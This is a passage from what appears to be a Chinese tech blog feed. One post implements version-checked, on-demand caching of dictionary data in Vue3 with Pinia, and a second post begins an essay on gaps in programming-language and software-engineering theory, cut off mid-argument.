<li><strong>缓存管理复杂</strong>：需要记录哪些数据已缓存，以便后续判断是否需要从缓存中读取或重新加载，增加了缓存管理的复杂度。</li>
<li><strong>缓存占用问题</strong>：对于不常使用的字典数据，缓存可能会占用不必要的存储空间，造成资源浪费。</li>
<li><strong>缓存更新难题</strong>：同样面临缓存更新的问题，需要设计合理的缓存更新策略，以保证数据的准确性和一致性。</li>
</ul>
<h3 data-id="heading-14">方案四：按需加载 + 版本校验更新缓存</h3>
<h4 data-id="heading-15">方案描述</h4>
<p>用户按需发起字典数据请求，首次访问某个字典数据时，从后端加载并缓存到本地。在后端响应头中携带该字典数据的版本信息，后续每次请求该字典数据时，前端对比本地缓存的版本信息和响应头中的版本信息。若版本信息不一致，则清除本地缓存中对应的字典数据，并重新从后端加载最新数据；若版本信息一致，则直接使用本地缓存的数据。</p>
<h4 data-id="heading-16">优点</h4>
<ul>
<li><strong>数据实时性有保障</strong>：通过版本校验机制，能够及时获取到字典数据的更新，确保前端使用的数据与后端保持一致，避免了因缓存数据未及时更新而导致的业务问题。</li>
<li><strong>减少不必要的网络请求</strong>：在字典数据未更新时，直接使用本地缓存，无需发起网络请求，节省了网络带宽和服务器资源。</li>
<li><strong>平衡存储与性能</strong>：既不会像首次全部加载那样占用大量本地存储空间，又能在一定程度上减少网络请求，在存储和性能之间取得了较好的平衡。</li>
</ul>
<h4 data-id="heading-17">缺点</h4>
<ul>
<li><strong>版本管理复杂</strong>：后端需要维护字典数据的版本信息，并且要确保版本号的准确性和唯一性，这增加了后端开发的复杂度和维护成本。</li>
<li><strong>额外开销</strong>：每次请求都需要进行版本信息对比操作，虽然开销较小，但在高并发场景下，可能会对系统性能产生一定影响。</li>
<li><strong>首次加载体验</strong>：首次加载字典数据时，依然需要从后端获取数据，若数据量较大或网络状况不佳，可能会影响用户体验。</li>
</ul>
<h3 data-id="heading-18">方案选型建议</h3>
<p>建议根据项目特性选择方案，没有最好的技术方案，只有最适合项目的技术方案：</p>
<ul>
<li><strong>字典稳定且量小</strong>：方案一全量缓存</li>
<li><strong>字典频繁更新</strong>：方案四版本校验缓存</li>
<li><strong>存储敏感场景</strong>：方案三按需缓存</li>
<li><strong>实时性要求极高</strong>：方案二无缓存方案</li>
</ul>
<blockquote>
<p>ps：如果大家有更好的方案，也可以在评论区提出，让我们大家一起学习成长</p>
</blockquote>
<h2 data-id="heading-19">代码实现（方案四）</h2>
<p>下述代码的实现基于vue3+pinia，该代码实现了统一管理全局字典数据，支持按需加载、缓存复用、版本控制、动态更新、批量处理字典数据等功能。</p>
<h3 data-id="heading-20">pinia store的实现</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { defineStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'pinia'</span>
<span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { getDictDetails, <span class="hljs-keyword">type</span> <span class="hljs-title class_">Details</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/api/system/dict'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useDictStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">'dict'</span>, <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// 存储字典数据，键为字典名称，值为字典详情数组</span>
    <span class="hljs-keyword">const</span> dictData = ref&lt;<span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">Details</span>[]&gt;&gt;({})
    <span class="hljs-comment">// 存储字典版本信息，键为字典名称，值为版本号</span>
    <span class="hljs-keyword">const</span> dictVersions = ref&lt;<span class="hljs-built_in">string</span>&gt;(<span class="hljs-string">''</span>)

    <span class="hljs-comment">/**
     * 更新字典版本信息
     * <span class="hljs-doctag">@param</span> version 新的字典版本号
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">updateDictVersion</span> = (<span class="hljs-params">version: <span class="hljs-built_in">string</span></span>) =&gt; {
        dictVersions.<span class="hljs-property">value</span> = version
    }

    <span class="hljs-comment">/**
     * 获取字典版本
     * <span class="hljs-doctag">@returns</span> 字典版本号
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDictVersion</span> = (<span class="hljs-params"/>) =&gt; {
        <span class="hljs-keyword">return</span> dictVersions.<span class="hljs-property">value</span> || <span class="hljs-string">''</span>
    }

    <span class="hljs-comment">/**
     * 加载字典数据
     * <span class="hljs-doctag">@param</span> dictNames 字典名称数组
     * <span class="hljs-doctag">@returns</span> 加载的字典数据对象
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDicts</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">dictNames: <span class="hljs-built_in">string</span>[]</span>) =&gt; {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(dictNames)) {
                <span class="hljs-keyword">return</span> {};
            }
            <span class="hljs-comment">// 过滤并去重有效字典名称</span>
            <span class="hljs-keyword">const</span> uniqueNames = [...<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(dictNames.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">name</span> =&gt;</span> 
                <span class="hljs-keyword">typeof</span> name === <span class="hljs-string">'string'</span> &amp;&amp; name.<span class="hljs-title function_">trim</span>()
            ))];
            
            <span class="hljs-keyword">if</span> (uniqueNames.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
                <span class="hljs-keyword">return</span> {};
            }

            <span class="hljs-keyword">const</span> <span class="hljs-attr">result</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">Details</span>[]&gt; = {};
            <span class="hljs-keyword">const</span> <span class="hljs-attr">unloadedDicts</span>: <span class="hljs-built_in">string</span>[] = [];

            <span class="hljs-comment">// 分离已加载和未加载的字典</span>
            dictNames.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">name</span> =&gt;</span> {
                <span class="hljs-keyword">if</span> (dictData.<span class="hljs-property">value</span>[name]) {
                    result[name] = dictData.<span class="hljs-property">value</span>[name];
                } <span class="hljs-keyword">else</span> {
                    unloadedDicts.<span class="hljs-title function_">push</span>(name);
                }
            });

            <span class="hljs-comment">// 如果有未加载的字典，从接口请求获取</span>
            <span class="hljs-keyword">if</span> (unloadedDicts.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
                <span class="hljs-keyword">const</span> { data } = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getDictDetails</span>(unloadedDicts);

                <span class="hljs-comment">// 合并新加载的数据到结果</span>
                <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(result, data);

                <span class="hljs-comment">// 更新全局字典缓存</span>
                <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(dictData.<span class="hljs-property">value</span>, data);
            }

            <span class="hljs-keyword">return</span> result;
        } <span class="hljs-keyword">catch</span> (error) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'加载字典数据失败:'</span>, error);
            <span class="hljs-keyword">return</span> {};
        }
    };

    <span class="hljs-comment">/**
     * 根据字典名称获取字典数据
     * <span class="hljs-doctag">@param</span> name 字典名称
     * <span class="hljs-doctag">@returns</span> 字典详情数组
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDict</span> = (<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) =&gt; {
        <span class="hljs-keyword">return</span> dictData.<span class="hljs-property">value</span>[name] || []
    }

    <span class="hljs-comment">/**
     * 根据字典名称和值获取字典标签
     * <span class="hljs-doctag">@param</span> name 字典名称
     * <span class="hljs-doctag">@param</span> value 字典值
     * <span class="hljs-doctag">@returns</span> 字典标签
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDictLabel</span> = (<span class="hljs-params">name: <span class="hljs-built_in">string</span>, value: <span class="hljs-built_in">string</span></span>) =&gt; {
        <span class="hljs-keyword">const</span> dict = <span class="hljs-title function_">getDict</span>(name)
        <span class="hljs-keyword">const</span> item = dict.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">value</span> === value)
        <span class="hljs-keyword">return</span> item?.<span class="hljs-property">label</span> || <span class="hljs-string">''</span>
    }

    <span class="hljs-comment">/**
     * 根据字典名称和标签获取字典值
     * <span class="hljs-doctag">@param</span> name 字典名称
     * <span class="hljs-doctag">@param</span> label 字典标签
     * <span class="hljs-doctag">@returns</span> 字典值
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDictValue</span> = (<span class="hljs-params">name: <span class="hljs-built_in">string</span>, label: <span class="hljs-built_in">string</span></span>) =&gt; {
        <span class="hljs-keyword">const</span> dict = <span class="hljs-title function_">getDict</span>(name)
        <span class="hljs-keyword">const</span> item = dict.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">label</span> === label)
        <span class="hljs-keyword">return</span> item?.<span class="hljs-property">value</span> || <span class="hljs-string">''</span>
    }

    <span class="hljs-comment">/**
     * 清除指定字典数据
     * <span class="hljs-doctag">@param</span> names 字典名称
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">clearDicts</span> = (<span class="hljs-params">names: <span class="hljs-built_in">string</span>[]</span>) =&gt; {
        names.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">name</span> =&gt;</span> {
            <span class="hljs-title function_">clearDict</span>(name)
        })
    }


    <span class="hljs-comment">/**
     * 清除指定字典数据
     * <span class="hljs-doctag">@param</span> name 字典名称
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">clearDict</span> = (<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) =&gt; {
        <span class="hljs-keyword">delete</span> dictData.<span class="hljs-property">value</span>[name]
    }

    <span class="hljs-comment">/**
     * 清除所有字典数据
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">clearAllDict</span> = (<span class="hljs-params"/>) =&gt; {
        dictData.<span class="hljs-property">value</span> = {}
    }

    <span class="hljs-keyword">return</span> {
        dictData,
        updateDictVersion,
        getDictVersion,
        getDict,
        getDicts,
        getDictLabel,
        getDictValue,
        clearDict,
        clearDicts,
        clearAllDict
    }
})
</code></pre>
<h3 data-id="heading-21">useDict 实现</h3>
<p>为组件提供<strong>字典数据的统一访问入口</strong>，封装了字典数据的初始化加载、详情查询、标签/值转换等高频操作，简化组件层对字典数据的调用逻辑。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { <span class="hljs-keyword">type</span> <span class="hljs-title class_">Details</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/api/system/dict'</span>
<span class="hljs-keyword">import</span> { useDictStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/store/dict'</span>

<span class="hljs-comment">// 根据字典值的name获取字典详情</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">useDict</span> = (<span class="hljs-params">params: <span class="hljs-built_in">string</span>[] = []</span>) =&gt; {

  <span class="hljs-keyword">const</span> dict = ref&lt;<span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">Details</span>[]&gt;&gt;()
  <span class="hljs-keyword">const</span> dictStore = <span class="hljs-title function_">useDictStore</span>()

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDicts</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    dict.<span class="hljs-property">value</span> = <span class="hljs-keyword">await</span> dictStore.<span class="hljs-title function_">getDicts</span>(params)
  }

  <span class="hljs-comment">// 初始化字典数据</span>
  <span class="hljs-title function_">getDicts</span>()

  <span class="hljs-comment">// 根据字典名称获取字典数据</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDict</span> = (<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) =&gt; {
    <span class="hljs-keyword">return</span> dictStore.<span class="hljs-title function_">getDict</span>(name)
  }

  <span class="hljs-comment">// 根据字典值获取字典label</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDictLabel</span> = (<span class="hljs-params">name: <span class="hljs-built_in">string</span>, value: <span class="hljs-built_in">string</span></span>) =&gt; {
    <span class="hljs-keyword">return</span> dictStore.<span class="hljs-title function_">getDictLabel</span>(name, value)
  }

  <span class="hljs-keyword">return</span> {
    dict,
    getDict,
    getDictLabel
  }
}
</code></pre>
<h3 data-id="heading-22">响应拦截</h3>
<p>主要用于获取字典的版本信息，通过对比版本信息，从而确定是否清除本地的字典缓存数据，并更新本地缓存的版本信息</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 响应拦截器</span>
service.<span class="hljs-property">interceptors</span>.<span class="hljs-property">response</span>.<span class="hljs-title function_">use</span>(
  <span class="hljs-comment">// AxiosResponse</span>
  <span class="hljs-function">(<span class="hljs-params">response: AxiosResponse</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> dictVersion = response.<span class="hljs-property">headers</span>[<span class="hljs-string">'x-dictionary-version'</span>]
    <span class="hljs-keyword">if</span> (dictVersion) {
      <span class="hljs-keyword">const</span> dictStore = <span class="hljs-title function_">useDictStore</span>()
      <span class="hljs-comment">// 对比版本是否有更新</span>
      <span class="hljs-keyword">if</span> (dictStore.<span class="hljs-title function_">getDictVersion</span>() !== dictVersion) {
        dictStore.<span class="hljs-title function_">clearAllDict</span>()
        dictStore.<span class="hljs-title function_">updateDictVersion</span>(dictVersion || <span class="hljs-string">''</span>)
      }
    }
    <span class="hljs-comment">// ...项目中的业务逻辑</span>
  }
)
</code></pre>
<h3 data-id="heading-23">项目中的具体使用</h3>
<p>下述的怎么使用封装的字典管理的简单demo</p>
<pre><code class="hljs language-ts" lang="ts">&lt;script setup lang=<span class="hljs-string">"ts"</span>&gt;
<span class="hljs-keyword">import</span> { useDict } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/hooks/useDict'</span>
<span class="hljs-comment">// 获取dict</span>
<span class="hljs-keyword">const</span> { dict, getDictLabel } =  <span class="hljs-title function_">useDict</span>([<span class="hljs-string">'status'</span>, <span class="hljs-string">'sex'</span>])
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dict.<span class="hljs-property">status</span>, dict.<span class="hljs-property">sex</span>)
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-24">项目源码地址</h3>
<p>nest后端</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FYangGong-Zi%2FUnusual-Server" target="_blank" title="https://github.com/YangGong-Zi/Unusual-Server" ref="nofollow noopener noreferrer">Unusual-Server (github)</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2FYancy_Hill%2Funusual-server" target="_blank" title="https://gitee.com/Yancy_Hill/unusual-server" ref="nofollow noopener noreferrer">Unusual-Server (gitee)</a></p>
<p>vue3前端</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fwzwdream%2FUnusual-Admin" target="_blank" title="https://github.com/wzwdream/Unusual-Admin" ref="nofollow noopener noreferrer">Unusual-Admin (github)</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fwang-zewei-dream%2FUnusual-Admin" target="_blank" title="https://gitee.com/wang-zewei-dream/Unusual-Admin" ref="nofollow noopener noreferrer">Unusual-Admin (gitee)</a></p>
<h2 data-id="heading-25">结语</h2>
<p>本文介绍了四种主流的数据字典实现方案，从全量加载到按需加载，从无缓存到版本校验缓存，每种方案都展现了其独特的优势与缺点。通过对比分析，我们不难发现，没有一种方案能够适用于所有场景，而是需要根据项目的具体特性进行灵活选择。对于字典稳定且量小的项目，全量缓存方案能够带来极致的响应速度；对于字典频繁更新的场景，版本校验缓存方案则能在保障数据实时性的同时，实现存储空间与网络请求的平衡优化。未来，随着技术的不断进步与应用场景的不断拓展，数据字典的实现方案也将持续演进。</p>
<blockquote>
<p>博客主要记录一些学习的文章，如有不足，望大家指出，谢谢。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[目前主流的程序语言与软件工程研究中真正严重的缺陷是什么？]]></title>    <link>https://juejin.cn/post/7581750253000572963</link>    <guid>https://juejin.cn/post/7581750253000572963</guid>    <pubDate>2025-12-10T02:35:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581750253000572963" data-draft-id="7581870491756740643" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="目前主流的程序语言与软件工程研究中真正严重的缺陷是什么？"/> <meta itemprop="keywords" content="后端,架构,数学"/> <meta itemprop="datePublished" content="2025-12-10T02:35:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="canonical_entropy"/> <meta itemprop="url" content="https://juejin.cn/user/4212984289694429"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            目前主流的程序语言与软件工程研究中真正严重的缺陷是什么？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4212984289694429/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    canonical_entropy
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:35:34.000Z" title="Wed Dec 10 2025 02:35:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读27分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>如果只从“某种语言不够优雅”“某种方法落地难”来谈缺陷，很容易停留在战术层面。要谈“真正严重的缺陷”，必须下潜到更底层的问题：</p>
<blockquote>
<p>目前主流的程序语言与软件工程理论，是用一种什么样的世界观在看软件？<br/>
而这个世界观，本身遗漏了什么？</p>
</blockquote>
<p>我会从三层来展开：</p>
<ol>
<li>学界主流范式到底在假定一个什么样的世界？这个世界观的边界在哪里？</li>
<li>真正的难题——长期演化与可变性管理——如何被系统性弱化甚至“理论外包”给工程实践？</li>
<li>如果承认这种缺口，可能的替代/补全方向是什么？“结构空间 + 差量（Δ）+ 合并（⊕）”这样的视角能补上什么？它如何把 MDA、SPL、DSL、DDD 等拉回一个统一框架？</li>
</ol>
<p>本文的核心主张，在引入“广义可逆计算（GRC）”之后，可以表述为：</p>
<blockquote>
<p>现有 PL/SE 理论，把“单个程序 + 静态正确性 + 一次性生成”当成中心，<br/>
却缺乏一套<strong>以差量（Δ）、合并（⊕）和程序族演化</strong>为核心的一般理论。</p>
<p>GRC 提出：<br/>
<strong>App = Generator ⊕ Δ</strong>，<br/>
即 <strong>Y = F(X) ⊕ Δ</strong>，<br/>
把“生成”和“演化”统一在一条方程里，把“变化”本身提升为一等公民。</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">一、主流范式的世界观，以及它遮蔽了什么</h2>
<h3 data-id="heading-1">1.1 类型与函数式：离散分类和静态正确性的胜利</h3>
<p>现代编程语言理论最耀眼的成果集中在：</p>
<ul>
<li>类型系统：Hindley–Milner、多态、System F、依赖类型、线性类型、effect system 等；</li>
<li>函数式语义：lambda 演算、denotational semantics、logical relations；</li>
<li>证明助手：Coq、Agda、Lean，把“程序 = 证明”的想法推向工业界。</li>
</ul>
<p>它们解决的是一个非常重要的问题：</p>
<blockquote>
<p>如何在局部、在单个程序或模块上，保证静态安全、语义清晰、行为可预测。</p>
</blockquote>
<p>但它们隐含了一组几乎不被说破的前提：</p>
<ol>
<li>
<p><strong>世界可以用有限/可数的“类型”分类</strong></p>
<ul>
<li>先认为值可以归类到若干 type；</li>
<li>再研究 type 之间的关系（子类型、多态、effect 标记等）；</li>
<li>研究重点是“哪些表达式是合法的”、“如何限制非法行为”。</li>
</ul>
</li>
<li>
<p><strong>关注点放在“一个静态程序”的性质上</strong></p>
<ul>
<li>一份源码、一个 AST，一个编译 artifact；</li>
<li>类型系统确保这一次构造的 artifact 有好性质；</li>
<li>“多版本演进”“变体族”“长期演化轨迹”不是主角。</li>
</ul>
</li>
<li>
<p><strong>默认是封闭世界</strong></p>
<ul>
<li>规格是给定的；</li>
<li>环境相对稳定；</li>
<li>不把“规格自身如何变化”当作一等对象。</li>
</ul>
</li>
</ol>
<p>所以，今天的 PL/类型理论的主线问题可以概括为：</p>
<blockquote>
<p>“如何更好地描述和验证一个<strong>给定程序</strong>的性质？”</p>
</blockquote>
<p>而不是：</p>
<blockquote>
<p>“这门语言所能生成的<strong>所有程序 + 它们所有演化路径</strong>构成什么样的结构空间？”</p>
</blockquote>
<p>把“单个程序”的静态正确性当成中心，把“程序族及其演化结构”当成外围工程问题，这是第一个结构性缺口。</p>
<p>更深一层是：这种以“类型 + 函数”为中心的视角，本质上是一种“等价类 + 变换”的世界观，天然不擅长表达“空间坐标上的场”和“在每个坐标点上附着的差量”。类型关注的是“这一撮值属于同一类”，而不是“这个值在结构空间里的位置”。</p>
<h3 data-id="heading-2">1.2 形式方法：多是“快照级”的，而不是“轨迹级”的</h3>
<p>Hoare 逻辑、模型检测、抽象解释、合约式设计，在安全协议、编译器、关键系统等领域非常成功。典型流程是：</p>
<ol>
<li>给出一个规格 Spec；</li>
<li>给出一个实现 P；</li>
<li>在某个逻辑/模型下证明：P ⊨ Spec。</li>
</ol>
<p>而真实的软件工程长期演化问题更像：</p>
<ul>
<li>Spec 在变（需求变化、不完整、一开始就不完备）；</li>
<li>P 不断有 patch、refactoring、变体定制；</li>
<li>同一“产品线”在不同客户、不同版本上形成一个族。</li>
</ul>
<p>目前形式方法里关于演化的工作是有的（incremental verification、regression verification、delta-oriented modeling 等），但总体上：</p>
<blockquote>
<p>规格/实现/证明，仍然被看作一系列离散快照之间的独立问题，<br/>
而不是一个在“演化空间”上持续运行的轨迹问题。</p>
</blockquote>
<p>换句话说：</p>
<ul>
<li>“某个固定版本 P 是否满足 Spec”有很多理论；</li>
<li>“整个程序族的演化结构是否有界、可控、可逆”几乎没有统一理论。</li>
</ul>
<p>这构成第二个严重缺陷：<strong>缺乏一套“面向演化的形式理论”——把差量、合并、版本族本身作为一等公民对象</strong>。</p>
<h3 data-id="heading-3">1.3 范畴论在 PL 中：从“空间语言”退化成“变换语法”</h3>
<p>范畴论本身是一个极其通用的数学元语言，既可以做代数，也可以做几何/拓扑，用于研究空间和局部数据。但在 PL 社区中的主流用法，大致是：</p>
<ul>
<li>对象 ≈ 类型；</li>
<li>态射 ≈ 函数/程序；</li>
<li>Monad/Functor/Arrow/Applicative ≈ 一套 effect 组合语法。</li>
</ul>
<p>从这一用法出发，范畴论主要被用来：</p>
<ul>
<li>把 effect 抽象掉（IO/State/Exception 都包装成 Monad）；</li>
<li>把复杂逻辑行为表达成纯函数的组合；</li>
<li>给语法构造一个“漂亮的代数骨架”。</li>
</ul>
<p>这非常有用，但它强化了一个 <strong>“变换中心”</strong> 的世界观：</p>
<blockquote>
<p>变换（function）是主角；<br/>
类型是变换的源和靶；<br/>
我们关心的是变换如何组合，而不是这些变换所作用的“空间本体”自身的结构和演化。</p>
</blockquote>
<p>对应到数学史上，这有点像停留在“变换群”阶段，而没有真正转向对“空间本身”的研究：</p>
<ul>
<li>群论可以研究对称变换；</li>
<li>但几何和物理会问：空间是什么？场是什么？局部扰动如何叠加？</li>
</ul>
<p>在 PL 中，我们大量研究“程序作为态射”，“程序组合的规律”，却几乎不研究：</p>
<blockquote>
<p>“语言所生成的全部程序结构，以及这些结构之间所有合法变形/演化构成的空间”是怎样的？<br/>
这个空间有什么坐标？什么是“局部扰动”？沿路径累积扰动产生的“积分”如何定义？</p>
